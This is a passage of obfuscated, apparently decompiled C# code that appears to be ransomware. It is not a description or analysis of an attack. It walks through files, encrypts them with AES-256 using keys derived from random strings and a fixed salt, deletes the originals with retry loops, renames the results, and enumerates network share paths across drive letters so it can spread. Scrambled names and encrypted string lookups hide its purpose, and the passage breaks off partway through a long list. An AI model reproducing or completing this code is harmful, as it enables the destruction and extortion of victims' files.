												XCKLADindvJZ.nhXRXZDxbmMGwhokOT(cjHnGtYwZMHzv.ZXZgprhWxBP.getString_0(107368564), cjHnGtYwZMHzv.ZXZgprhWxBP.getString_0(107368559), cjHnGtYwZMHzv.ZXZgprhWxBP.getString_0(107368578), CS_0024_003C_003E8__locals0.jHcqeHIPeN);
											}
											catch
											{
											}
										}
									}
								});
								thread.IsBackground = false;
								thread.Priority = ThreadPriority.Normal;
								thread.Start();
							}
							string text = SznTIlYhfLTN.eXlzrfSfGzN(32);
							string s = YYqwPFDAXdJ.cKyevcNdVhPKbErXE(text);
							byte[] bytes = Encoding.ASCII.GetBytes(s);
							if (dVeczuFsmFhaWQ == cjHnGtYwZMHzv.getString_0(107397176))
							{
								byte[] array = null;
								byte[] byte_ = YkOjxnmurVCfbj.QfkbKHDJftu(CS_0024_003C_003E8__locals0.jHcqeHIPeN, Convert.ToInt32(WsRteVdKTkKpED) * 1024 * 1024);
								if (!YkOjxnmurVCfbj.QNMHgTJICNuFwEj(aZxQiYswrzEMHo: (!xIEYdRogbJjk) ? (DfXjMyctTQk ? YkOjxnmurVCfbj.WsadWEYMhPkNa(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : YkOjxnmurVCfbj.WsadWEYMhPkNa(byte_, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.UOfCooZEtXM), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (DfXjMyctTQk ? NVikUgaKetXUZt.GbzVpJVLoYrET(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : NVikUgaKetXUZt.GbzVpJVLoYrET(byte_, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.UOfCooZEtXM), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), qtBBAGkzVvLoDw: CS_0024_003C_003E8__locals0.jHcqeHIPeN, BPtIRqUKxRmcJT: bytes))
								{
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.jHcqeHIPeN + CS_0024_003C_003E8__locals0.YZBBEXJSEfzFSqOL, CS_0024_003C_003E8__locals0.jHcqeHIPeN);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!DfXjMyctTQk)
							{
								if (!KEPDVlpbgsoad.kCRjVccpOKvz(CS_0024_003C_003E8__locals0.jHcqeHIPeN, WsRteVdKTkKpED, CS_0024_003C_003E8__locals0.UOfCooZEtXM))
								{
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.jHcqeHIPeN + CS_0024_003C_003E8__locals0.YZBBEXJSEfzFSqOL, CS_0024_003C_003E8__locals0.jHcqeHIPeN);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!KEPDVlpbgsoad.kCRjVccpOKvz(CS_0024_003C_003E8__locals0.jHcqeHIPeN, WsRteVdKTkKpED, text, bytes))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.jHcqeHIPeN + CS_0024_003C_003E8__locals0.YZBBEXJSEfzFSqOL, CS_0024_003C_003E8__locals0.jHcqeHIPeN);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else
						{
							if (JaGTzvkqDZS)
							{
								CS_0024_003C_003E8__locals0.YZBBEXJSEfzFSqOL = WorQZGhMrwJuixubIO + CS_0024_003C_003E8__locals0.YZBBEXJSEfzFSqOL;
							}
							string text2 = SznTIlYhfLTN.eXlzrfSfGzN(32);
							string s2 = YYqwPFDAXdJ.cKyevcNdVhPKbErXE(text2);
							byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
							if (CS_0024_003C_003E8__locals0.YZBBEXJSEfzFSqOL != cjHnGtYwZMHzv.getString_0(107462022))
							{
								if (!tEHYMAajqyQN)
								{
									if (!DfXjMyctTQk)
									{
										lnQkjKFYbeSHtD(CS_0024_003C_003E8__locals0.jHcqeHIPeN, CS_0024_003C_003E8__locals0.jHcqeHIPeN + CS_0024_003C_003E8__locals0.YZBBEXJSEfzFSqOL, fDTUzhDlmgg);
									}
									else
									{
										lnQkjKFYbeSHtD(CS_0024_003C_003E8__locals0.jHcqeHIPeN, CS_0024_003C_003E8__locals0.jHcqeHIPeN + CS_0024_003C_003E8__locals0.YZBBEXJSEfzFSqOL, Encoding.ASCII.GetBytes(text2));
									}
								}
								else
								{
									try
									{
										if (!DfXjMyctTQk)
										{
											UaSzdRmAlgEilgQY(CS_0024_003C_003E8__locals0.jHcqeHIPeN, CS_0024_003C_003E8__locals0.jHcqeHIPeN + CS_0024_003C_003E8__locals0.YZBBEXJSEfzFSqOL, fDTUzhDlmgg);
										}
										else
										{
											UaSzdRmAlgEilgQY(CS_0024_003C_003E8__locals0.jHcqeHIPeN, CS_0024_003C_003E8__locals0.jHcqeHIPeN + CS_0024_003C_003E8__locals0.YZBBEXJSEfzFSqOL, Encoding.ASCII.GetBytes(text2));
										}
									}
									catch (Exception ex11)
									{
										if (qphnWLJhmOUolrV)
										{
											try
											{
												File.AppendAllText(GqXvKuGfqke, cjHnGtYwZMHzv.getString_0(107461784) + CS_0024_003C_003E8__locals0.jHcqeHIPeN + cjHnGtYwZMHzv.getString_0(107462040) + ex11.Message + cjHnGtYwZMHzv.getString_0(107396430));
											}
											catch (Exception)
											{
											}
										}
										CfPnwVRgYaXy++;
										try
										{
											File.Move(CS_0024_003C_003E8__locals0.jHcqeHIPeN + CS_0024_003C_003E8__locals0.YZBBEXJSEfzFSqOL, CS_0024_003C_003E8__locals0.jHcqeHIPeN);
											return;
										}
										catch (Exception)
										{
											return;
										}
									}
								}
							}
							else if (!tEHYMAajqyQN)
							{
								if (!DfXjMyctTQk)
								{
									lnQkjKFYbeSHtD(CS_0024_003C_003E8__locals0.jHcqeHIPeN, CS_0024_003C_003E8__locals0.jHcqeHIPeN + cjHnGtYwZMHzv.getString_0(107462049), fDTUzhDlmgg);
								}
								else
								{
									lnQkjKFYbeSHtD(CS_0024_003C_003E8__locals0.jHcqeHIPeN, CS_0024_003C_003E8__locals0.jHcqeHIPeN + cjHnGtYwZMHzv.getString_0(107462049), Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!DfXjMyctTQk)
									{
										UaSzdRmAlgEilgQY(CS_0024_003C_003E8__locals0.jHcqeHIPeN, CS_0024_003C_003E8__locals0.jHcqeHIPeN, fDTUzhDlmgg);
									}
									else
									{
										UaSzdRmAlgEilgQY(CS_0024_003C_003E8__locals0.jHcqeHIPeN, CS_0024_003C_003E8__locals0.jHcqeHIPeN, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex14)
								{
									if (qphnWLJhmOUolrV)
									{
										try
										{
											File.AppendAllText(GqXvKuGfqke, cjHnGtYwZMHzv.getString_0(107461784) + CS_0024_003C_003E8__locals0.jHcqeHIPeN + cjHnGtYwZMHzv.getString_0(107462040) + ex14.Message + cjHnGtYwZMHzv.getString_0(107396430));
										}
										catch (Exception)
										{
										}
									}
									CfPnwVRgYaXy++;
									return;
								}
							}
							if (DfXjMyctTQk)
							{
								if (CS_0024_003C_003E8__locals0.YZBBEXJSEfzFSqOL != cjHnGtYwZMHzv.getString_0(107462022))
								{
									jIMiBnTvhHRYVy(CS_0024_003C_003E8__locals0.jHcqeHIPeN + CS_0024_003C_003E8__locals0.YZBBEXJSEfzFSqOL, bytes2);
								}
								else
								{
									jIMiBnTvhHRYVy(CS_0024_003C_003E8__locals0.jHcqeHIPeN, bytes2);
								}
							}
						}
						end_IL_085c_2:;
					}
					catch (Exception)
					{
					}
				}
			}
			goto IL_1000;
			IL_1000:
			CS_0024_003C_003E8__locals0.GNntzJbksCJrMo.Remove(CS_0024_003C_003E8__locals0.jHcqeHIPeN);
		});
	}

	private static void biWcRVcvAHlr(string string_0, string string_1, byte[] byte_0)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(string_1, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Dispose();
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (string_1.Length > 0)
				{
					FileStream fileStream3 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (NgNETKMlSjJng == getString_0(107396727))
					{
						foreach (string item in chWKKaOgedu)
						{
							if (string_0.ToLower().EndsWith(item) && fWqlqykUBEVkds == getString_0(107396727))
							{
								if (Convert.ToInt32(wQqHVBAZmaYqT) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										XCKLADindvJZ.nhXRXZDxbmMGwhokOT(getString_0(107368538), getString_0(107368533), getString_0(107368552), string_0);
									}
									catch
									{
									}
								}
							}
							else if (string_0.ToLower().EndsWith(item) && fWqlqykUBEVkds == getString_0(107397156))
							{
								try
								{
									XCKLADindvJZ.nhXRXZDxbmMGwhokOT(getString_0(107368538), getString_0(107368533), getString_0(107368552), string_0);
								}
								catch
								{
								}
							}
						}
					}
					fileStream3.Dispose();
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(string_0) && num2 >= 0)
							{
								File.Delete(string_0);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (string_1.EndsWith(getString_0(107462029)))
					{
						File.Move(string_1, string_1.Replace(getString_0(107462029), getString_0(107368489)));
					}
					return;
				}
				try
				{
					File.Delete(string_1);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}

	public static void UaSzdRmAlgEilgQY(string string_0, string string_1, byte[] byte_0)
	{
		try
		{
			if (NgNETKMlSjJng == getString_0(107396727))
			{
				FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
				foreach (string item in chWKKaOgedu)
				{
					if (string_0.ToLower().EndsWith(item) && fWqlqykUBEVkds == getString_0(107396727))
					{
						if (Convert.ToInt32(wQqHVBAZmaYqT) * 1024 * 1024 > fileStream.Length)
						{
							try
							{
								XCKLADindvJZ.nhXRXZDxbmMGwhokOT(getString_0(107368538), getString_0(107368533), getString_0(107368552), string_0);
							}
							catch
							{
							}
						}
					}
					else if (string_0.ToLower().EndsWith(item) && fWqlqykUBEVkds == getString_0(107397156))
					{
						try
						{
							XCKLADindvJZ.nhXRXZDxbmMGwhokOT(getString_0(107368538), getString_0(107368533), getString_0(107368552), string_0);
						}
						catch
						{
						}
					}
				}
				fileStream.Dispose();
			}
		}
		catch
		{
		}
		if (string_0 != string_1)
		{
			File.Move(string_0, string_1);
			string_0 = string_1;
		}
		byte[] bytes = NVikUgaKetXUZt.GbzVpJVLoYrET(File.ReadAllBytes(string_0), byte_0, new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
		File.WriteAllBytes(string_0, bytes);
		eHvSFFSwlBBvD++;
	}

	private static void lnQkjKFYbeSHtD(string string_0, string string_1, byte[] byte_0)
	{
		kVtitiYGHzxvpcH CS_0024_003C_003E8__locals0 = new kVtitiYGHzxvpcH();
		CS_0024_003C_003E8__locals0.pbeGHysKIBJDSm = string_0;
		CS_0024_003C_003E8__locals0.HNPIPTDlSQjg = string_1;
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			string hNPIPTDlSQjg = CS_0024_003C_003E8__locals0.HNPIPTDlSQjg;
			FileStream fileStream = new FileStream(hNPIPTDlSQjg, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			try
			{
				if (HTIndamVwXrIE == getString_0(107396727))
				{
					MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(CS_0024_003C_003E8__locals0.pbeGHysKIBJDSm, FileMode.Open);
					MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
					memoryMappedFile.Dispose();
					int num;
					while ((num = memoryMappedViewStream.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num);
					}
					memoryMappedViewStream.Dispose();
				}
				else
				{
					FileStream fileStream2 = new FileStream(CS_0024_003C_003E8__locals0.pbeGHysKIBJDSm, FileMode.Open);
					int num2;
					while ((num2 = fileStream2.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num2);
					}
					fileStream2.Dispose();
				}
			}
			catch (Exception)
			{
				FileStream fileStream3 = new FileStream(CS_0024_003C_003E8__locals0.pbeGHysKIBJDSm, FileMode.Open);
				int num3;
				while ((num3 = fileStream3.ReadByte()) != -1)
				{
					cryptoStream.WriteByte((byte)num3);
				}
				fileStream3.Dispose();
			}
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (CS_0024_003C_003E8__locals0.HNPIPTDlSQjg.Length > 0)
				{
					if (NgNETKMlSjJng == getString_0(107396727))
					{
						FileStream fileStream4 = new FileStream(CS_0024_003C_003E8__locals0.pbeGHysKIBJDSm, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
						foreach (string item in chWKKaOgedu)
						{
							if (CS_0024_003C_003E8__locals0.pbeGHysKIBJDSm.ToLower().EndsWith(item) && fWqlqykUBEVkds == getString_0(107396727))
							{
								if (Convert.ToInt32(wQqHVBAZmaYqT) * 1024 * 1024 > fileStream4.Length)
								{
									try
									{
										XCKLADindvJZ.nhXRXZDxbmMGwhokOT(getString_0(107368538), getString_0(107368533), getString_0(107368552), CS_0024_003C_003E8__locals0.pbeGHysKIBJDSm);
									}
									catch
									{
									}
								}
							}
							else if (CS_0024_003C_003E8__locals0.pbeGHysKIBJDSm.ToLower().EndsWith(item) && fWqlqykUBEVkds == getString_0(107397156))
							{
								try
								{
									XCKLADindvJZ.nhXRXZDxbmMGwhokOT(getString_0(107368538), getString_0(107368533), getString_0(107368552), CS_0024_003C_003E8__locals0.pbeGHysKIBJDSm);
								}
								catch
								{
								}
							}
						}
						fileStream4.Dispose();
					}
					Thread thread = new Thread((ThreadStart)delegate
					{
						while (true)
						{
							try
							{
								File.Delete(CS_0024_003C_003E8__locals0.pbeGHysKIBJDSm);
								break;
							}
							catch
							{
								Thread.Sleep(1500);
							}
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (CS_0024_003C_003E8__locals0.HNPIPTDlSQjg.EndsWith(getString_0(107462029)))
					{
						File.Move(CS_0024_003C_003E8__locals0.HNPIPTDlSQjg, CS_0024_003C_003E8__locals0.HNPIPTDlSQjg.Replace(getString_0(107462029), getString_0(107368489)));
					}
					return;
				}
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					while (true)
					{
						try
						{
							if (File.Exists(CS_0024_003C_003E8__locals0.HNPIPTDlSQjg))
							{
								File.Delete(CS_0024_003C_003E8__locals0.HNPIPTDlSQjg);
							}
							break;
						}
						catch
						{
							Thread.Sleep(1500);
						}
					}
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = true;
				thread2.Start();
			}
			catch
			{
			}
		}
		catch (Exception ex2)
		{
			if (qphnWLJhmOUolrV)
			{
				try
				{
					File.AppendAllText(GqXvKuGfqke, getString_0(107461764) + CS_0024_003C_003E8__locals0.pbeGHysKIBJDSm + getString_0(107462020) + ex2.Message + getString_0(107396410));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	private static void _003CMain_003Eb__6()
	{
		List<string> source = xEsusUJpPleGEu;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatef == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegatef = delegate(string string_0)
			{
				VKiZFXRXdSmDy(DRlXtEGdcAr(getString_0(107461455)), string_0);
			};
		}
		Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegatef);
		List<string> wcWfRegXKTTamv = WcWfRegXKTTamv;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
			{
				VKiZFXRXdSmDy(DRlXtEGdcAr(getString_0(107461442)), string_0);
			};
		}
		Parallel.ForEach(wcWfRegXKTTamv, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
		if (NQNKoSWmegHO == getString_0(107396727))
		{
			string[] source2 = pNHGfyiizpSvpI;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
				{
					VKiZFXRXdSmDy(DRlXtEGdcAr(getString_0(107461442)), getString_0(107461417) + string_0 + getString_0(107461376));
				};
			}
			Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
		}
		if (!MobVTSLPgWz().Contains(getString_0(107462110)))
		{
			mNXtAeoohfKy(jRkHacbmdHPVi);
		}
		else
		{
			List<string> rWyHSlEBUZLMaY = RWyHSlEBUZLMaY;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
				{
					VKiZFXRXdSmDy(DRlXtEGdcAr(XVYVEQqAqPwoG(getString_0(107461371))), string_0);
				};
			}
			Parallel.ForEach(rWyHSlEBUZLMaY, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
		}
		List<string> source3 = nRyHvPuGTGYjWsbq;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 = delegate(string string_0)
			{
				VKiZFXRXdSmDy(DRlXtEGdcAr(getString_0(107461378)), string_0);
			};
		}
		Parallel.ForEach(source3, CS_0024_003C_003E9__CachedAnonymousMethodDelegate13);
	}

	private static void _003CMain_003Eb__7(string string_0)
	{
		VKiZFXRXdSmDy(DRlXtEGdcAr(getString_0(107461455)), string_0);
	}

	private static void _003CMain_003Eb__8(string string_0)
	{
		VKiZFXRXdSmDy(DRlXtEGdcAr(getString_0(107461442)), string_0);
	}

	private static void _003CMain_003Eb__9(string string_0)
	{
		VKiZFXRXdSmDy(DRlXtEGdcAr(getString_0(107461442)), getString_0(107461417) + string_0 + getString_0(107461376));
	}

	private static void _003CMain_003Eb__a(string string_0)
	{
		VKiZFXRXdSmDy(DRlXtEGdcAr(XVYVEQqAqPwoG(getString_0(107461371))), string_0);
	}

	private static void _003CMain_003Eb__b(string string_0)
	{
		VKiZFXRXdSmDy(DRlXtEGdcAr(getString_0(107461378)), string_0);
	}

	private static void _003CMapDrv_003Eb__18(string string_0)
	{
		CNuQcpTYjrLDCL CS_0024_003C_003E8__locals0 = new CNuQcpTYjrLDCL();
		CS_0024_003C_003E8__locals0.CsXsTwSZWKw = string_0;
		if ((!CS_0024_003C_003E8__locals0.CsXsTwSZWKw.StartsWith(getString_0(107461329)) && !CS_0024_003C_003E8__locals0.CsXsTwSZWKw.StartsWith(getString_0(107461356)) && !CS_0024_003C_003E8__locals0.CsXsTwSZWKw.StartsWith(getString_0(107461347)) && !CS_0024_003C_003E8__locals0.CsXsTwSZWKw.StartsWith(getString_0(107461302))) || !HSPEpTDPLKNFw.PHPWDFfcULSK(CS_0024_003C_003E8__locals0.CsXsTwSZWKw))
		{
			return;
		}
		try
		{
			Thread.Sleep(rrxeEOhCBbfFLgvV);
			vjXOwyOsZFHuY.Add(getString_0(107366751) + CS_0024_003C_003E8__locals0.CsXsTwSZWKw + getString_0(107461325));
			try
			{
				if (IrtcteVbDJMbKD)
				{
					Console.WriteLine(getString_0(107366751) + CS_0024_003C_003E8__locals0.CsXsTwSZWKw + getString_0(107461325));
				}
			}
			catch
			{
			}
			Parallel.For(68, 91, delegate(int int_0)
			{
				Thread.Sleep(rrxeEOhCBbfFLgvV);
				vjXOwyOsZFHuY.Add(CNuQcpTYjrLDCL.getString_0(107366757) + CS_0024_003C_003E8__locals0.CsXsTwSZWKw + CNuQcpTYjrLDCL.getString_0(107397167) + (char)int_0 + CNuQcpTYjrLDCL.getString_0(107477696));
				try
				{
					if (IrtcteVbDJMbKD)
					{
						Console.WriteLine(CNuQcpTYjrLDCL.getString_0(107366757) + CS_0024_003C_003E8__locals0.CsXsTwSZWKw + CNuQcpTYjrLDCL.getString_0(107397167) + (char)int_0 + CNuQcpTYjrLDCL.getString_0(107477696));
					}
				}
				catch
				{
				}
			});
		}
		catch
		{
		}
	}

	static EEGkMyyVIDL()
	{
		Strings.CreateGetStringDelegate(typeof(EEGkMyyVIDL));
		xTxFXXfbdYYKqKr = getString_0(107367609);
		fDTUzhDlmgg = null;
		vwwbhwOABO = getString_0(107397156);
		UZIiquGHnbBZH = getString_0(107461316);
		vjXOwyOsZFHuY = new List<string>();
		YoDewAClrMWW = new List<string>();
		eyrrZwSCYTADi = getString_0(107397156);
		UOfCooZEtXM = getString_0(107368489);
		CVJRzPfpAOOaE = getString_0(107368489);
		OfisjkQgBaKT = getString_0(107397156);
		jWkhxRkXbvA = 0;
		xfkNWisgyvAPU = getString_0(107396727);
		ziKpJPHirDj = getString_0(107397156);
		kgvNCYAsIRXtAPvIa = getString_0(107397156);
		QybvCJOZUSCUZ = getString_0(107461271);
		axzEDgTUby = getString_0(107397156);
		RqmXVZQFWCu = getString_0(107397156);
		luhpGRdnkbFP = getString_0(107397156);
		ZVpOsTOahvYy = getString_0(107397156);
		ROHCjzwysDWe = new List<string>
		{
			DRlXtEGdcAr(getString_0(107461266)),
			DRlXtEGdcAr(getString_0(107461281)),
			DRlXtEGdcAr(getString_0(107461256)),
			DRlXtEGdcAr(getString_0(107461719)),
			DRlXtEGdcAr(getString_0(107461694)),
			DRlXtEGdcAr(getString_0(107461701)),
			DRlXtEGdcAr(getString_0(107461652)),
			DRlXtEGdcAr(getString_0(107461627)),
			DRlXtEGdcAr(getString_0(107461634)),
			DRlXtEGdcAr(getString_0(107461609)),
			DRlXtEGdcAr(getString_0(107461560)),
			DRlXtEGdcAr(getString_0(107461535)),
			DRlXtEGdcAr(getString_0(107461542))
		};
		nfYRZbrPjpWWw = new List<string>();
		zwxjPZelNXY = getString_0(107396727);
		sZmFuXSSTt = getString_0(107397156);
		vupRuLVRMiFn = getString_0(107397156);
		UdjWdPcrsN = new List<string>();
		GoYBdoxJtLgwHQ = getString_0(107397156);
		WmSdtnBtFGZ = getString_0(107461517);
		uUqSvzVKAfyGAz = getString_0(107396727);
		SLRbFHPPhKk = getString_0(107397156);
		YtCxXntkhTkUk = new List<string>
		{
			DRlXtEGdcAr(getString_0(107460924)),
			DRlXtEGdcAr(getString_0(107460891)),
			DRlXtEGdcAr(getString_0(107460858)),
			DRlXtEGdcAr(getString_0(107460825)),
			DRlXtEGdcAr(getString_0(107460792)),
			DRlXtEGdcAr(getString_0(107460763)),
			DRlXtEGdcAr(getString_0(107460738)),
			DRlXtEGdcAr(getString_0(107461221)),
			DRlXtEGdcAr(getString_0(107461144)),
			DRlXtEGdcAr(getString_0(107461079)),
			DRlXtEGdcAr(getString_0(107461046)),
			DRlXtEGdcAr(getString_0(107461013)),
			DRlXtEGdcAr(getString_0(107460980)),
			DRlXtEGdcAr(getString_0(107460439)),
			DRlXtEGdcAr(getString_0(107460410)),
			DRlXtEGdcAr(getString_0(107460369)),
			DRlXtEGdcAr(getString_0(107460360)),
			DRlXtEGdcAr(getString_0(107460303)),
			DRlXtEGdcAr(getString_0(107460222)),
			DRlXtEGdcAr(getString_0(107460701)),
			DRlXtEGdcAr(getString_0(107460672)),
			DRlXtEGdcAr(getString_0(107460631)),
			DRlXtEGdcAr(getString_0(107460622)),
			DRlXtEGdcAr(getString_0(107460589)),
			DRlXtEGdcAr(getString_0(107460508)),
			DRlXtEGdcAr(getString_0(107460483)),
			DRlXtEGdcAr(getString_0(107459898)),
			DRlXtEGdcAr(getString_0(107459869)),
			DRlXtEGdcAr(getString_0(107459828)),
			DRlXtEGdcAr(getString_0(107459771)),
			DRlXtEGdcAr(getString_0(107459706)),
			DRlXtEGdcAr(getString_0(107460193)),
			DRlXtEGdcAr(getString_0(107460096)),
			DRlXtEGdcAr(getString_0(107460079)),
			DRlXtEGdcAr(getString_0(107460014)),
			DRlXtEGdcAr(getString_0(107459413)),
			DRlXtEGdcAr(getString_0(107459380)),
			DRlXtEGdcAr(getString_0(107459371)),
			DRlXtEGdcAr(getString_0(107459330)),
			DRlXtEGdcAr(getString_0(107459253)),
			DRlXtEGdcAr(getString_0(107459224)),
			DRlXtEGdcAr(getString_0(107459671)),
			DRlXtEGdcAr(getString_0(107459662)),
			DRlXtEGdcAr(getString_0(107459629)),
			DRlXtEGdcAr(getString_0(107459588)),
			DRlXtEGdcAr(getString_0(107459507)),
			DRlXtEGdcAr(getString_0(107459494)),
			DRlXtEGdcAr(getString_0(107458877)),
			DRlXtEGdcAr(getString_0(107458864)),
			DRlXtEGdcAr(getString_0(107458819)),
			DRlXtEGdcAr(getString_0(107458742)),
			DRlXtEGdcAr(getString_0(107458733)),
			DRlXtEGdcAr(getString_0(107459172)),
			DRlXtEGdcAr(getString_0(107459143)),
			DRlXtEGdcAr(getString_0(107459070)),
			DRlXtEGdcAr(getString_0(107459005)),
			DRlXtEGdcAr(getString_0(107458992)),
			DRlXtEGdcAr(getString_0(107458931)),
			DRlXtEGdcAr(getString_0(107458406)),
			DRlXtEGdcAr(getString_0(107458341)),
			DRlXtEGdcAr(getString_0(107458312)),
			DRlXtEGdcAr(getString_0(107458255)),
			DRlXtEGdcAr(getString_0(107458190)),
			DRlXtEGdcAr(getString_0(107458661)),
			DRlXtEGdcAr(getString_0(107458632)),
			DRlXtEGdcAr(getString_0(107458559)),
			DRlXtEGdcAr(getString_0(107458510)),
			DRlXtEGdcAr(getString_0(107458417)),
			DRlXtEGdcAr(getString_0(107457864)),
			DRlXtEGdcAr(getString_0(107457787)),
			DRlXtEGdcAr(getString_0(107457754)),
			DRlXtEGdcAr(getString_0(107457713)),
			DRlXtEGdcAr(getString_0(107457668)),
			DRlXtEGdcAr(getString_0(107458103)),
			DRlXtEGdcAr(getString_0(107458014)),
			DRlXtEGdcAr(getString_0(107457997)),
			DRlXtEGdcAr(getString_0(107457968)),
			DRlXtEGdcAr(getString_0(107457927)),
			DRlXtEGdcAr(getString_0(107457350)),
			DRlXtEGdcAr(getString_0(107457269)),
			DRlXtEGdcAr(getString_0(107457212)),
			DRlXtEGdcAr(getString_0(107457179)),
			DRlXtEGdcAr(getString_0(107457630)),
			DRlXtEGdcAr(getString_0(107457605)),
			DRlXtEGdcAr(getString_0(107459413)),
			DRlXtEGdcAr(getString_0(107457548)),
			DRlXtEGdcAr(getString_0(107457507)),
			DRlXtEGdcAr(getString_0(107457418)),
			DRlXtEGdcAr(getString_0(107456829)),
			DRlXtEGdcAr(getString_0(107456768)),
			DRlXtEGdcAr(getString_0(107456775)),
			DRlXtEGdcAr(getString_0(107456698)),
			DRlXtEGdcAr(getString_0(107456681)),
			DRlXtEGdcAr(getString_0(107459771)),
			DRlXtEGdcAr(getString_0(107457128)),
			DRlXtEGdcAr(getString_0(107457055)),
			DRlXtEGdcAr(getString_0(107457030)),
			DRlXtEGdcAr(getString_0(107459706)),
			DRlXtEGdcAr(getString_0(107456925)),
			DRlXtEGdcAr(getString_0(107456908)),
			DRlXtEGdcAr(getString_0(107456275)),
			DRlXtEGdcAr(getString_0(107456210)),
			DRlXtEGdcAr(getString_0(107456193)),
			DRlXtEGdcAr(getString_0(107460096)),
			DRlXtEGdcAr(getString_0(107456596)),
			DRlXtEGdcAr(getString_0(107459380)),
			DRlXtEGdcAr(getString_0(107460079)),
			DRlXtEGdcAr(getString_0(107456563)),
			DRlXtEGdcAr(getString_0(107456506)),
			DRlXtEGdcAr(getString_0(107460014)),
			DRlXtEGdcAr(getString_0(107456473)),
			DRlXtEGdcAr(getString_0(107456456)),
			DRlXtEGdcAr(getString_0(107456375)),
			DRlXtEGdcAr(getString_0(107459828)),
			DRlXtEGdcAr(getString_0(107455838)),
			DRlXtEGdcAr(getString_0(107455793)),
			DRlXtEGdcAr(getString_0(107455764)),
			DRlXtEGdcAr(getString_0(107455735)),
			DRlXtEGdcAr(getString_0(107455722)),
			DRlXtEGdcAr(getString_0(107455689)),
			DRlXtEGdcAr(getString_0(107455664)),
			DRlXtEGdcAr(getString_0(107455619)),
			DRlXtEGdcAr(getString_0(107456106)),
